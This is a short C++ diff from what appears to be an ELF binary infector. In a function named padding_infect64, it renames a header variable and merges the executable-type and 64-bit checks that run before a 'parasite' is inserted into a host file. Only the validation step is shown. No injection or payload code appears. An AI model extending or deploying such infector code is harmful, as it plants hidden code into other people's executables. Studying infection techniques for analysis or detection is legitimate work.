@@ -178,12 +178,10 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
 
 bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                       vt::common::Mmap<PROT_READ> parasite_mapping) {
-  const Elf64_Ehdr* host_header =
+  const Elf64_Ehdr* ehdr =
       reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  if (host_header->e_type != ET_EXEC && host_header->e_type != ET_DYN) {
-    return false;
-  }
-  if (host_header->e_ident[EI_CLASS] != ELFCLASS64) {
+  if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN ||
+      ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
     return false;
   }
 
